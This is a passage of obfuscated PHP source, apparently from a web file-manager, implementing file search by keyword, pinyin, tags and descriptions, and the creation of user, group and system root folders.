Model($ªÒİÍ¨Ç[611])->getInfo($ ¡÷ Àû); $™æôÚ×— = array($ªÒİÍ¨Ç[665] => SourceModel::TYPE_USER, $ªÒİÍ¨Ç[598] => array($ªÒİÍ¨Ç[629], $ªÒİÍ¨Ç[607] . $•ß’ÉÄì[$ªÒİÍ¨Ç[90]][$ªÒİÍ¨Ç[194]] . $ªÒİÍ¨Ç[630]), $ªÒİÍ¨Ç[666] => $ ¡÷ Àû, $ªÒİÍ¨Ç[663] => 0, $ªÒİÍ¨Ç[664] => $š€ë˜·¦); return $this->listSource($™æôÚ×—); } public function listSearch($ò±ËØ¡´, $©¹‘²Ì¨ = 300) { $èÅ¡Ü–Ç =& $_SERVER[ˆö¿ÚÌ¼]; if (isset($ò±ËØ¡´[$èÅ¡Ü–Ç[2084]]) && $ò±ËØ¡´[$èÅ¡Ü–Ç[2084]]) { $ò±ËØ¡´[$èÅ¡Ü–Ç[2084]] = str_replace($èÅ¡Ü–Ç[463], $èÅ¡Ü–Ç[2254], trim($ò±ËØ¡´[$èÅ¡Ü–Ç[2084]])); } $’î‚²¦· = $this->_parseSearchWhere($ò±ËØ¡´); if (!isset($’î‚²¦·[$èÅ¡Ü–Ç[517]])) { $’î‚²¦·[$èÅ¡Ü–Ç[517]] = 0; } $ø¶Éò¾ë = $èÅ¡Ü–Ç[2255]; $ÙÙ›ñÖ— = $’î‚²¦·; $÷ò¨Å„§ = $ø¶Éò¾ë; $this->_listSearchBindPinyin($ò±ËØ¡´, $’î‚²¦·, $ø¶Éò¾ë); $this->alias($èÅ¡Ü–Ç[531])->_makeOrder(); $’î‚²¦· = $this->parseWhereLike($’î‚²¦·); $“ëÀŸºÜ = $this->distinct(!0)->field($ø¶Éò¾ë)->where($’î‚²¦·)->selectPage($©¹‘²Ì¨); if ($GLOBALS[$èÅ¡Ü–Ç[6]][$èÅ¡Ü–Ç[460]][$èÅ¡Ü–Ç[461]] && Input::check($ò±ËØ¡´[$èÅ¡Ü–Ç[2084]], $èÅ¡Ü–Ç[672]) && $“ëÀŸºÜ[$èÅ¡Ü–Ç[445]][$èÅ¡Ü–Ç[431]] == 1 && $“ëÀŸºÜ[$èÅ¡Ü–Ç[445]][$èÅ¡Ü–Ç[446]] == 0) { $“ëÀŸºÜ = $this->distinct(!0)->field($ø¶Éò¾ë)->where($ÙÙ›ñÖ—)->limit(1000)->select(); $“ëÀŸºÜ = array_page_split($“ëÀŸºÜ, !1, $©¹‘²Ì¨); } $this->_listSearchFileContent($“ëÀŸºÜ, $ò±ËØ¡´, $÷ò¨Å„§, $ÙÙ›ñÖ—); $this->_listSearchDesc($“ëÀŸºÜ, $ò±ËØ¡´, $÷ò¨Å„§); $this->_listSearchTag($“ëÀŸºÜ, $ò±ËØ¡´, $÷ò¨Å„§); $this->_listSearchGroupTag($“ëÀŸºÜ, $ò±ËØ¡´, $÷ò¨Å„§); $this->_listDataApply($“ëÀŸºÜ[$èÅ¡Ü–Ç[448]]); $this->_listMake($“ëÀŸºÜ); return $“ëÀŸºÜ; } private function _listSearchFileContent(&$²İ‰ä»Ü, $‹·ãÑÁ, $š³øÇÌÅ, $Œùãë·Ô) { $…×Ä¿Öü =& $_SERVER[ˆö¿ÚÌ¼]; if (!$‹·ãÑÁ[$…×Ä¿Öü[2084]] || $²İ‰ä»Ü[$…×Ä¿Öü[445]][$…×Ä¿Öü[431]] > 1) { return; } if (!isset($Œùãë·Ô[$…×Ä¿Öü[32]]) || !is_array($‹·ãÑÁ[$…×Ä¿Öü[555]])) { return; } $Œùãë·Ô[$…×Ä¿Öü[555]] = array($…×Ä¿Öü[7], $‹·ãÑÁ[$…×Ä¿Öü[555]]); unset($Œùãë·Ô[$…×Ä¿Öü[32]]); unset($‹·ãÑÁ[$…×Ä¿Öü[555]]); $ÛªÇñ´ = $this->field($š³øÇÌÅ)->where($Œùãë·Ô)->limit($…×Ä¿Öü[2256])->select(); if (!$ÛªÇñ´ || count($ÛªÇñ´) == 0) { return; } $²İ‰ä»Ü[$…×Ä¿Öü[448]] = array_merge($ÛªÇñ´, $²İ‰ä»Ü[$…×Ä¿Öü[448]]); $²İ‰ä»Ü[$…×Ä¿Öü[445]][$…×Ä¿Öü[446]] += count($ÛªÇñ´); } private function _listSearchTag(&$³ì–Ñ®, $“Ê’œâ, $À×ëÕúÅ) { $ı‰ÏÏ—Œ =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($“Ê’œâ[$ı‰ÏÏ—Œ[1944]]) || !in_array($ı‰ÏÏ—Œ[2257], $“Ê’œâ[$ı‰ÏÏ—Œ[1944]])) { return; } if (!$“Ê’œâ[$ı‰ÏÏ—Œ[2084]] || $³ì–Ñ®[$ı‰ÏÏ—Œ[445]][$ı‰ÏÏ—Œ[431]] > 1) { return; } $Š‚‘½Ÿ = Model($ı‰ÏÏ—Œ[2258])->listData(); $£®Ïïš² = array(); $‡ÖŠÖª  = $“Ê’œâ[$ı‰ÏÏ—Œ[2084]]; foreach ($Š‚‘½Ÿ as $ş¦ØÛÅ›) { $ä¾–™­Ï = $ş¦ØÛÅ›[$ı‰ÏÏ—Œ[32]]; $Ëµôø = str_replace($ı‰ÏÏ—Œ[53], $ı‰ÏÏ—Œ[12], Pinyin::get($ä¾–™­Ï)); if (stripos($ä¾–™­Ï, $‡ÖŠÖª ) !== !1 || stripos($Ëµôø, $‡ÖŠÖª ) !== !1) { $£®Ïïš²[] = $ş¦ØÛÅ›[$ı‰ÏÏ—Œ[478]]; } } if (!$£®Ïïš²) { return; } $Š½Åº™ä = array($ı‰ÏÏ—Œ[512] => array($ı‰ÏÏ—Œ[7], $£®Ïïš²), $ı‰ÏÏ—Œ[1785] => USER_ID); $®¡ĞÅŞ = Model($ı‰ÏÏ—Œ[514])->field($ı‰ÏÏ—Œ[87])->where($Š½Åº™ä)->select(); $®¡ĞÅŞ = array_to_keyvalue($®¡ĞÅŞ, $ı‰ÏÏ—Œ[12], $ı‰ÏÏ—Œ[87]); $ÎÜ›¬ë = array_unique($®¡ĞÅŞ); $this->_listSearchMerge($³ì–Ñ®, $“Ê’œâ, $À×ëÕúÅ, $ÎÜ›¬ë); } private function _listSearchDesc(&$®›‘µ¤ú, $†Şœğƒ¾, $¿Ëğä») { $ÖøÅè¼ù =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($†Şœğƒ¾[$ÖøÅè¼ù[1944]]) || !in_array($ÖøÅè¼ù[538], $†Şœğƒ¾[$ÖøÅè¼ù[1944]])) { return; } if (!$†Şœğƒ¾[$ÖøÅè¼ù[2084]] || $®›‘µ¤ú[$ÖøÅè¼ù[445]][$ÖøÅè¼ù[431]] > 1) { return; } $ı®­ÊĞ = array($ÖøÅè¼ù[97] => $ÖøÅè¼ù[538], $ÖøÅè¼ù[453] => array($ÖøÅè¼ù[462], $ÖøÅè¼ù[2086] . $†Şœğƒ¾[$ÖøÅè¼ù[2084]] . $ÖøÅè¼ù[2086])); $İ‡Ùç¹ç = !1; if ($İ‡Ùç¹ç) { $ùºæôÛÉ = $this->listSearchChildren($†Şœğƒ¾[$ÖøÅè¼ù[193]]); $ùºæôÛÉ = array_unique($ùºæôÛÉ); if (!$ùºæôÛÉ) { return; } $ı®­ÊĞ[$ÖøÅè¼ù[194]] = array($ÖøÅè¼ù[7], $ùºæôÛÉ); } $İËİ·ÛÃ = Model($ÖøÅè¼ù[649])->field($ÖøÅè¼ù[194])->where($ı®­ÊĞ)->limit(5000)->select(); $¶¿®Š• = array_to_keyvalue($İËİ·ÛÃ, $ÖøÅè¼ù[12], $ÖøÅè¼ù[194]); $this->_listSearchMerge($®›‘µ¤ú, $†Şœğƒ¾, $¿Ëğä», $¶¿®Š•); } private function _listSearchGroupTag(&$õĞÏ™ê, $Óê“÷«, $ÊòÙÉ™õ) { $Ç°¥å§ =& $_SERVER[ˆö¿ÚÌ¼]; if (empty($Óê“÷«[$Ç°¥å§[1944]]) || !in_array($Ç°¥å§[2257], $Óê“÷«[$Ç°¥å§[1944]])) { return; } if (!$Óê“÷«[$Ç°¥å§[2084]] || $õĞÏ™ê[$Ç°¥å§[445]][$Ç°¥å§[431]] > 1 || !$Óê“÷«[$Ç°¥å§[193]]) { return; } $Ÿò¿ë = $this->sourceInfo($Óê“÷«[$Ç°¥å§[193]]); if (!$Ÿò¿ë || $Ÿò¿ë[$Ç°¥å§[191]] != SourceModel::TYPE_GROUP) { return; } $¡”İÀ¦ = $Ÿò¿ë[$Ç°¥å§[583]]; $¾æÈè°ı = Model($Ç°¥å§[2259])->get($¡”İÀ¦); $¥¶Ù®œ÷ = array(); $•¥™© = $Óê“÷«[$Ç°¥å§[2084]]; foreach ($¾æÈè°ı[$Ç°¥å§[448]] as $“æó³ÇŞ) { $Ùı°¢³Ú = $“æó³ÇŞ[$Ç°¥å§[32]]; $÷‘ÈÅ’ = str_replace($Ç°¥å§[53], $Ç°¥å§[12], Pinyin::get($Ùı°¢³Ú)); if (stripos($Ùı°¢³Ú, $•¥™©) !== !1 || stripos($÷‘ÈÅ’, $•¥™©) !== !1) { $¥¶Ù®œ÷[] = $“æó³ÇŞ[$Ç°¥å§[478]]; } } if (!$¥¶Ù®œ÷) { return; } $«øÚÌÒ = array($Ç°¥å§[512] => array($Ç°¥å§[7], $¥¶Ù®œ÷), $Ç°¥å§[1785] => 0, $Ç°¥å§[33] => $Ç°¥å§[2106] . $¡”İÀ¦); $½şô›ŸÑ = Model($Ç°¥å§[514])->field($Ç°¥å§[87])->where($«øÚÌÒ)->select(); $½şô›ŸÑ = array_to_keyvalue($½şô›ŸÑ, $Ç°¥å§[12], $Ç°¥å§[87]); $’ºÑïª = array_unique($½şô›ŸÑ); $this->_listSearchMerge($õĞÏ™ê, $Óê“÷«, $ÊòÙÉ™õ, $’ºÑïª); } private function _listSearchMerge(&$Ï¼Â“œÁ, $Ò™£¢è€, $·şìø±Š, $ıèè†ªó) { $öÀœİ± =& $_SERVER[ˆö¿ÚÌ¼]; if (!$ıèè†ªó) { return; } $®ï¶ğ = array_to_keyvalue($Ï¼Â“œÁ[$öÀœİ±[448]], $öÀœİ±[12], $öÀœİ±[194]); $íª”³­í = array_diff($ıèè†ªó, $®ï¶ğ); if (!$íª”³­í) { return; } $åØÅ”ÚŸ = array($öÀœİ±[194] => array($öÀœİ±[7], $íª”³­í)); $¿“˜‡ô = $this->field($·şìø±Š)->where($åØÅ”ÚŸ)->select(); if (!$¿“˜‡ô) { return; } $ïª—ä¶º = array(); foreach ($¿“˜‡ô as $§øØ©˜) { if ($this->_listSearchFilter($§øØ©˜, $Ò™£¢è€)) { $ïª—ä¶º[] = $§øØ©˜; } } $Ï¼Â“œÁ[$öÀœİ±[448]] = array_merge($ïª—ä¶º, $Ï¼Â“œÁ[$öÀœİ±[448]]); $Ï¼Â“œÁ[$öÀœİ±[445]][$öÀœİ±[446]] += count($ïª—ä¶º); } private function _listSearchFilter($Ñ‘ÏáÎ, $™ï¯šú–) { $Œ¿‰ñ‚³ =& $_SERVER[ˆö¿ÚÌ¼]; $°“¿­º¢ = $Ñ‘ÏáÎ[$Œ¿‰ñ‚³[497]] == $Œ¿‰ñ‚³[91]; if (!strstr($Ñ‘ÏáÎ[$Œ¿‰ñ‚³[598]], $Œ¿‰ñ‚³[50] . $™ï¯šú–[$Œ¿‰ñ‚³[193]] . $Œ¿‰ñ‚³[50])) { return !1; } if (isset($™ï¯šú–[$Œ¿‰ñ‚³[498]]) && $™ï¯šú–[$Œ¿‰ñ‚³[498]] != $Œ¿‰ñ‚³[861]) { if ($™ï¯šú–[$Œ¿‰ñ‚³[498]] == $Œ¿‰ñ‚³[78] && !$°“¿­º¢) { return !1; } if ($™ï¯šú–[$Œ¿‰ñ‚³[498]] != $Œ¿‰ñ‚³[78] && $°“¿­º¢) { return !1; } if (!strstr($Ñ‘ÏáÎ[$Œ¿‰ñ‚³[169]], $Œ¿‰ñ‚³[50] . $™ï¯šú–[$Œ¿‰ñ‚³[498]] . $Œ¿‰ñ‚³[50])) { return !1; } } if (isset($™ï¯šú–[$Œ¿‰ñ‚³[2260]]) && $™ï¯šú–[$Œ¿‰ñ‚³[2260]] < $Ñ‘ÏáÎ[$Œ¿‰ñ‚³[79]]) { return !1; } if (isset($™ï¯šú–[$Œ¿‰ñ‚³[2261]]) && $™ï¯šú–[$Œ¿‰ñ‚³[2261]] > $Ñ‘ÏáÎ[$Œ¿‰ñ‚³[79]]) { return !1; } if (isset($™ï¯šú–[$Œ¿‰ñ‚³[679]]) && $™ï¯šú–[$Œ¿‰ñ‚³[679]] != $Ñ‘ÏáÎ[$Œ¿‰ñ‚³[541]]) { return !1; } return !0; } public function listSearchChildren($Ü†ŸÅäÑ, $øÒÓçÍ© = 5000) { $êÆ©ÁÃ =& $_SERVER[ˆö¿ÚÌ¼]; $À¾ı®ş = array(); $§Šôß¼Î = $this->sourceInfo($Ü†ŸÅäÑ); $ãî Çá¦ = array($êÆ©ÁÃ[598] => array($êÆ©ÁÃ[462], $§Šôß¼Î[$êÆ©ÁÃ[598]] . $§Šôß¼Î[$êÆ©ÁÃ[194]] . $êÆ©ÁÃ[630])); $™ÌÊü”— = $this->field($êÆ©ÁÃ[79])->where($ãî Çá¦)->limit($øÒÓçÍ© + 1)->select(); $³ğ×Í = is_array($™ÌÊü”—) ? count($™ÌÊü”—) : 0; if ($³ğ×Í > $øÒÓçÍ©) { return $this->_listSearchChildrenNear($Ü†ŸÅäÑ, $øÒÓçÍ©); } $ŒüÓ Å‹ = $this->field($êÆ©ÁÃ[194])->where($ãî Çá¦)->select(); $À¾ı®ş = array_to_keyvalue($ŒüÓ Å‹, $êÆ©ÁÃ[12], $êÆ©ÁÃ[194]); return $À¾ı®ş; } private function _listSearchChildrenNear($á‹¹İÉİ, $íùª‡ÕÑ) { $¹ùŒÂÅ =& $_SERVER[ˆö¿ÚÌ¼]; $Œ§ªøÕ = array(); $„øåäÂ¡ = array($¹ùŒÂÅ[193] => $á‹¹İÉİ); $İ³‚û”« = $this->field($¹ùŒÂÅ[2262])->where($„øåäÂ¡)->select(); $»ù‡º‹ = array_to_keyvalue(array_filter_by_field($İ³‚û”«, $¹ùŒÂÅ[497], $¹ùŒÂÅ[91]), $¹ùŒÂÅ[12], $¹ùŒÂÅ[194]); $Œ§ªøÕ = array_merge($Œ§ªøÕ, array_to_keyvalue($İ³‚û”«, $¹ùŒÂÅ[12], $¹ùŒÂÅ[194])); if (!$»ù‡º‹) { return $Œ§ªøÕ; } $„øåäÂ¡ = array($¹ùŒÂÅ[193] => array($¹ùŒÂÅ[7], $»ù‡º‹)); $İ³‚û”« = $this->field($¹ùŒÂÅ[2262])->where($„øåäÂ¡)->limit($íùª‡ÕÑ)->select(); $Œ§ªøÕ = array_merge($Œ§ªøÕ, array_to_keyvalue($İ³‚û”«, $¹ùŒÂÅ[12], $¹ùŒÂÅ[194])); $Œ§ªøÕ = array_slice($Œ§ªøÕ, 0, intval($íùª‡ÕÑ)); return $Œ§ªøÕ; } private function _listSearchBindPinyin($Á“’Šü, &$—Ëàƒ¯Â, &$‚ß©°£) { $ËÅ‘ µ¾ =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($Á“’Šü[$ËÅ‘ µ¾[2084]]) || !$Á“’Šü[$ËÅ‘ µ¾[2084]]) { return; } if (!Input::check($Á“’Šü[$ËÅ‘ µ¾[2084]], $ËÅ‘ µ¾[396]) || strlen($Á“’Šü[$ËÅ‘ µ¾[2084]]) < 2) { return; } $²˜úêš· = "\114\105\x46\x54\x20\x4a\117\x49\x4e\x20{$this->tablePrefix}\151\157\137\x73\157\165\x72\x63\x65\137\155\x65\x74\141\40\155\145\164\141\x20\157\156\x20\x73\157\x75\x72\x63\x65\x2e\163\157\x75\x72\x63\145\x49\x44\40\x3d\x20\155\x65\164\141\x2e\x73\157\165\162\143\145\111\x44"; $ı„Ğ¾¸Ó = array(); $‚ß©°£ = str_replace(array($ËÅ‘ µ¾[288], $ËÅ‘ µ¾[53], $ËÅ‘ µ¾[2263]), $ËÅ‘ µ¾[12], $‚ß©°£); $‚ß©°£ = $ËÅ‘ µ¾[523] . str_replace($ËÅ‘ µ¾[50], $ËÅ‘ µ¾[524], $‚ß©°£); $ÎãÇËñÀ = $—Ëàƒ¯Â[$ËÅ‘ µ¾[32]]; unset($—Ëàƒ¯Â[$ËÅ‘ µ¾[32]]); foreach ($—Ëàƒ¯Â as $¤°İ‡Œ” => $ß€Î¾¨í) { $ı„Ğ¾¸Ó[$ËÅ‘ µ¾[523] . $¤°İ‡Œ”] = $ß€Î¾¨í; } foreach ($ÎãÇËñÀ as $´ù·Úßü) { $ı„Ğ¾¸Ó[] = array($ËÅ‘ µ¾[528] => $´ù·Úßü, $ËÅ‘ µ¾[1091] => $ËÅ‘ µ¾[2088], array($ËÅ‘ µ¾[2264] => $´ù·Úßü, $ËÅ‘ µ¾[2265] => array($ËÅ‘ µ¾[7], array($ËÅ‘ µ¾[550], $ËÅ‘ µ¾[549])))); } $this->join($²˜úêš·); $—Ëàƒ¯Â = $ı„Ğ¾¸Ó; } private function _parseSearchWhere($Ã¡à­Öó) { $›ê¦‘¦ü =& $_SERVER[ˆö¿ÚÌ¼]; $ŒÔˆöˆı = array(); if (isset($Ã¡à­Öó[$›ê¦‘¦ü[845]]) && $Ã¡à­Öó[$›ê¦‘¦ü[845]]) { $ŒÔˆöˆı[$›ê¦‘¦ü[88]] = array($›ê¦‘¦ü[2266], $Ã¡à­Öó[$›ê¦‘¦ü[845]]); } if (isset($Ã¡à­Öó[$›ê¦‘¦ü[846]]) && $Ã¡à­Öó[$›ê¦‘¦ü[846]]) { $„¸õ§¢ = array($›ê¦‘¦ü[2267], $Ã¡à­Öó[$›ê¦‘¦ü[846]]); if ($ŒÔˆöˆı[$›ê¦‘¦ü[88]]) { $ŒÔˆöˆı[$›ê¦‘¦ü[88]] = array($ŒÔˆöˆı[$›ê¦‘¦ü[88]], $„¸õ§¢, $›ê¦‘¦ü[2268]); } else { $ŒÔˆöˆı[$›ê¦‘¦ü[88]] = $„¸õ§¢; } } if (isset($Ã¡à­Öó[$›ê¦‘¦ü[2260]]) && $Ã¡à­Öó[$›ê¦‘¦ü[2260]] > 0) { $ŒÔˆöˆı[$›ê¦‘¦ü[79]] = array($›ê¦‘¦ü[2266], $Ã¡à­Öó[$›ê¦‘¦ü[2260]]); } if (isset($Ã¡à­Öó[$›ê¦‘¦ü[2261]]) && $Ã¡à­Öó[$›ê¦‘¦ü[2261]]) { $„¸õ§¢ = array($›ê¦‘¦ü[2267], $Ã¡à­Öó[$›ê¦‘¦ü[2261]]); if ($ŒÔˆöˆı[$›ê¦‘¦ü[79]]) { $ŒÔˆöˆı[$›ê¦‘¦ü[79]] = array($ŒÔˆöˆı[$›ê¦‘¦ü[79]], $„¸õ§¢, $›ê¦‘¦ü[2268]); } else { $ŒÔˆöˆı[$›ê¦‘¦ü[79]] = $„¸õ§¢; } } if (isset($Ã¡à­Öó[$›ê¦‘¦ü[679]]) && $Ã¡à­Öó[$›ê¦‘¦ü[679]]) { $ŒÔˆöˆı[] = array($›ê¦‘¦ü[541] => $Ã¡à­Öó[$›ê¦‘¦ü[679]], $›ê¦‘¦ü[539] => $Ã¡à­Öó[$›ê¦‘¦ü[679]], $›ê¦‘¦ü[1091] => $›ê¦‘¦ü[2088]); } if (isset($Ã¡à­Öó[$›ê¦‘¦ü[498]]) && $Ã¡à­Öó[$›ê¦‘¦ü[498]]) { $ äà¦šß = $Ã¡à­Öó[$›ê¦‘¦ü[498]]; if ($ äà¦šß == $›ê¦‘¦ü[78]) { $ŒÔˆöˆı[$›ê¦‘¦ü[497]] = 1; } else { if ($ äà¦šß == $›ê¦‘¦ü[2269]) { $ŒÔˆöˆı[$›ê¦‘¦ü[497]] = 0; } else { if ($ äà¦šß) { $ äà¦šß = is_array($ äà¦šß) ? $ äà¦šß : explode($›ê¦‘¦ü[50], $ äà¦šß); $ŒÔˆöˆı[$›ê¦‘¦ü[498]] = array($›ê¦‘¦ü[504], $ äà¦šß); $ŒÔˆöˆı[$›ê¦‘¦ü[497]] = 0; } } } } $this->_parseSearchParent($Ã¡à­Öó, $ŒÔˆöˆı); if (isset($Ã¡à­Öó[$›ê¦‘¦ü[2084]]) && trim($Ã¡à­Öó[$›ê¦‘¦ü[2084]])) { $£–Ü¼‹Ñ = trim($Ã¡à­Öó[$›ê¦‘¦ü[2084]]); $™ÚßòŒ¬ = explode($›ê¦‘¦ü[53], $£–Ü¼‹Ñ); if (strlen($£–Ü¼‹Ñ) > 2 && (substr($£–Ü¼‹Ñ, 0, 1) == $›ê¦‘¦ü[121] && substr($£–Ü¼‹Ñ, -1) == $›ê¦‘¦ü[121]) || substr($£–Ü¼‹Ñ, 0, 1) == $›ê¦‘¦ü[58] && substr($£–Ü¼‹Ñ, -1) == $›ê¦‘¦ü[58]) { $£–Ü¼‹Ñ = substr($£–Ü¼‹Ñ, 1, -1); $™ÚßòŒ¬ = array($£–Ü¼‹Ñ); } $ŒÔˆöˆı[$›ê¦‘¦ü[32]] = array(array($›ê¦‘¦ü[629], $›ê¦‘¦ü[2086] . $£–Ü¼‹Ñ . $›ê¦‘¦ü[2086])); if (count($™ÚßòŒ¬) > 1) { $ŒÔˆöˆı[$›ê¦‘¦ü[32]] = array(); foreach ($™ÚßòŒ¬ as $Õàç³”ù) { if (!trim($Õàç³”ù)) { continue; } $ŒÔˆöˆı[$›ê¦‘¦ü[32]][] = array($›ê¦‘¦ü[629], $›ê¦‘¦ü[2086] . trim($Õàç³”ù) . $›ê¦‘¦ü[2086]); } } } return $ŒÔˆöˆı; } private function _parseSearchParent($Ûñã‘áş, &$¾¼Ïˆí‹) { $¹Êô©ÂÓ =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($Ûñã‘áş[$¹Êô©ÂÓ[193]]) || !$Ûñã‘áş[$¹Êô©ÂÓ[193]]) { return; } $ƒå†·Ğû = $this->pathInfo($Ûñã‘áş[$¹Êô©ÂÓ[193]]); $ªèœ­ä– = $ƒå†·Ğû[$¹Êô©ÂÓ[193]] . $¹Êô©ÂÓ[12] === $¹Êô©ÂÓ[231]; $†§®±ü = $ƒå†·Ğû[$¹Êô©ÂÓ[191]] == $¹Êô©ÂÓ[592]; if ($ƒå†·Ğû[$¹Êô©ÂÓ[608]] == $¹Êô©ÂÓ[609]) { $·ÆÑ¥Ôï = $this->sourceInfo($Ûñã‘áş[$¹Êô©ÂÓ[193]]); $ƒå†·Ğû[$¹Êô©ÂÓ[598]] = $·ÆÑ¥Ôï[$¹Êô©ÂÓ[598]]; } $¾¼Ïˆí‹[$¹Êô©ÂÓ[669]] = array($¹Êô©ÂÓ[629], $ƒå†·Ğû[$¹Êô©ÂÓ[598]] . $Ûñã‘áş[$¹Êô©ÂÓ[193]] . $¹Êô©ÂÓ[630]); $ŸçÌËŠŒ = isset($Ûñã‘áş[$¹Êô©ÂÓ[1944]]) && in_array($¹Êô©ÂÓ[592], $Ûñã‘áş[$¹Êô©ÂÓ[1944]]); if (!$ŸçÌËŠŒ || !$†§®±ü || !$ªèœ­ä– || !$ƒå†·Ğû[$¹Êô©ÂÓ[499]]) { return; } if (!AuthModel::authCheckRoot($ƒå†·Ğû[$¹Êô©ÂÓ[499]][$¹Êô©ÂÓ[500]])) { return; } $Œ‚´‰ÌÇ = $ƒå†·Ğû[$¹Êô©ÂÓ[583]] . $¹Êô©ÂÓ[12]; if ($Œ‚´‰ÌÇ == $¹Êô©ÂÓ[91]) { unset($¾¼Ïˆí‹[$¹Êô©ÂÓ[669]]); $¾¼Ïˆí‹[$¹Êô©ÂÓ[191]] = self::TYPE_GROUP; return; } $ğÕäÔÀÌ = Model($¹Êô©ÂÓ[599])->groupChildrenAll($Œ‚´‰ÌÇ); $åä¾•½ç = count($ğÕäÔÀÌ); if ($åä¾•½ç <= 1) { return; } $¸™èÒ³ = array($¹Êô©ÂÓ[193] => 0, $¹Êô©ÂÓ[191] => self::TYPE_GROUP, $¹Êô©ÂÓ[583] => array($¹Êô©ÂÓ[7], $ğÕäÔÀÌ)); $‰º£Ã§è = $this->field($¹Êô©ÂÓ[2270])->where($¸™èÒ³)->limit($åä¾•½ç)->select(); $¾¼Ïˆí‹[$¹Êô©ÂÓ[669]] = array(); foreach ($‰º£Ã§è as $äöÆìÅ‘) { $¾¼Ïˆí‹[$¹Êô©ÂÓ[669]][] = array($¹Êô©ÂÓ[629], $¹Êô©ÂÓ[607] . $äöÆìÅ‘[$¹Êô©ÂÓ[194]] . $¹Êô©ÂÓ[630]); } $¾¼Ïˆí‹[$¹Êô©ÂÓ[669]][] = $¹Êô©ÂÓ[2088]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ñ“ĞÜİ) { $œ×ÆÖÕÕ =& $_SERVER[ˆö¿ÚÌ¼]; $Æâ¶êô¤ = Model($œ×ÆÖÕÕ[591])->where(array($œ×ÆÖÕÕ[1776] => $ñ“ĞÜİ))->find(); $×É¢¾ŒÏ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ñ“ĞÜİ, $Æâ¶êô¤[$œ×ÆÖÕÕ[32]]); $this->userDesktopAdd($×É¢¾ŒÏ); return $×É¢¾ŒÏ; } public function userDesktopAdd($˜÷´®Ö) { $Üê„¼Øó =& $_SERVER[ˆö¿ÚÌ¼]; $Û ëÍÖ = LNG($Üê„¼Øó[2271]); $øƒ¨ıÀÛ = $this->mkdir($˜÷´®Ö, $Û ëÍÖ); $this->metaSet($øƒ¨ıÀÛ, $Üê„¼Øó[2272], $Üê„¼Øó[91]); $this->metaSet($˜÷´®Ö, $Üê„¼Øó[2273], $øƒ¨ıÀÛ); } public function userPathSafeAdd($é”œ›°©) { $ûÖÑß¶ş =& $_SERVER[ˆö¿ÚÌ¼]; $âë¸û› = Model($ûÖÑß¶ş[591])->getInfoFull($é”œ›°©); if (!$âë¸û›) { return !1; } if (_get($âë¸û›, $ûÖÑß¶ş[612])) { return $âë¸û›[$ûÖÑß¶ş[553]][$ûÖÑß¶ş[2274]]; } $«³éßŸ¹ = $this->_mkdirRoot(SourceModel::TYPE_USER, $é”œ›°©, $ûÖÑß¶ş[2275], $ûÖÑß¶ş[2276]); Model($ûÖÑß¶ş[591])->metaSet($é”œ›°©, $ûÖÑß¶ş[2274], $«³éßŸ¹); $this->metaSet($«³éßŸ¹, $ûÖÑß¶ş[2277], $é”œ›°©); return $«³éßŸ¹; } public function userPathAppAdd($À…³Š », $€ ‹´Ô› = '', $³üùÌîø = '') { $õŠÕ½íı =& $_SERVER[ˆö¿ÚÌ¼]; $–ç÷À¯™ = Model($õŠÕ½íı[591])->getInfoFull($À…³Š »); if (!$–ç÷À¯™) { return !1; } $ºñ›µÙ = $–ç÷À¯™[$õŠÕ½íı[553]] ? $–ç÷À¯™[$õŠÕ½íı[553]] : array(); $îè¨¢Óñ = $ºñ›µÙ[$õŠÕ½íı[2278]]; if (!$îè¨¢Óñ) { $îè¨¢Óñ = $this->_mkdirRoot(SourceModel::TYPE_USER, $À…³Š », $õŠÕ½íı[2279], $õŠÕ½íı[2280]); Model($õŠÕ½íı[591])->metaSet($À…³Š », $õŠÕ½íı[2278], $îè¨¢Óñ . $õŠÕ½íı[12]); $this->metaSet($îè¨¢Óñ, $õŠÕ½íı[2278], $À…³Š »); } if (!$€ ‹´Ô›) { return $îè¨¢Óñ; } $ÒÒ·×§ = $ºñ›µÙ[$õŠÕ½íı[2281] . $€ ‹´Ô›]; if (!$ÒÒ·×§) { $ÒÒ·×§ = $this->mkdir($îè¨¢Óñ, $€ ‹´Ô›); Model($õŠÕ½íı[591])->metaSet($À…³Š », $õŠÕ½íı[2281] . $€ ‹´Ô›, $ÒÒ·×§); $this->metaSet($ÒÒ·×§, $õŠÕ½íı[2281] . $€ ‹´Ô›, $À…³Š »); } if (!$³üùÌîø) { return $ÒÒ·×§; } $éÔ¼îªÔ = $this->mkdir($ÒÒ·×§, $³üùÌîø); return $éÔ¼îªÔ; } public function groupRootAdd($æÚÉë¢) { $»İãéÔÍ =& $_SERVER[ˆö¿ÚÌ¼]; $Ç„ÅúæÒ = Model($»İãéÔÍ[599])->where(array($»İãéÔÍ[2078] => $æÚÉë¢))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $æÚÉë¢, $Ç„ÅúæÒ[$»İãéÔÍ[32]]); } public function systemRootPathAdd($“·Í€‹) { if ($“·Í€‹ != $_SERVER[ˆö¿ÚÌ¼][622]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $“·Í€‹); } public function userRootRemove($™‹–øşË) { $­š¯éä… = $this->targetSourceRoot(SourceModel::TYPE_USER, $™‹–øşË, !0); foreach ($­š¯éä… as $ìƒÑÜß›) { if (!$ìƒÑÜß›) { continue; } $this->remove($ìƒÑÜß›[$_SERVER[ˆö¿ÚÌ¼][194]], !1); } } public function groupRootRemove($·Ê„ü©) { $–¢øÎ‡ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $·Ê„ü©); if (!$–¢øÎ‡) { return; } $this->remove($–¢øÎ‡[$_SERVER[ˆö¿ÚÌ¼][194]], !1); } private function _mkdirRoot($á€èŞî¹, $ÁÙ„«’Ø, $ÏâÙ‹¢¸, $£›äéÔ¯ = '') { $ˆœ¼Œàú =& $_SERVER[ˆö¿ÚÌ¼]; $¿¥£†ö£ = defined($ˆœ¼Œàú[2216]) ? USER_ID : 0; $êåÕÀ©Ë = array($ˆœ¼Œàú[489] => 0, $ˆœ¼Œàú[665] => $á€èŞî¹, $ˆœ¼Œàú[666] => $ÁÙ„«’Ø, $ˆœ¼Œàú[663] => 1, $ˆœ¼Œàú[667] => $¿¥£†ö£, 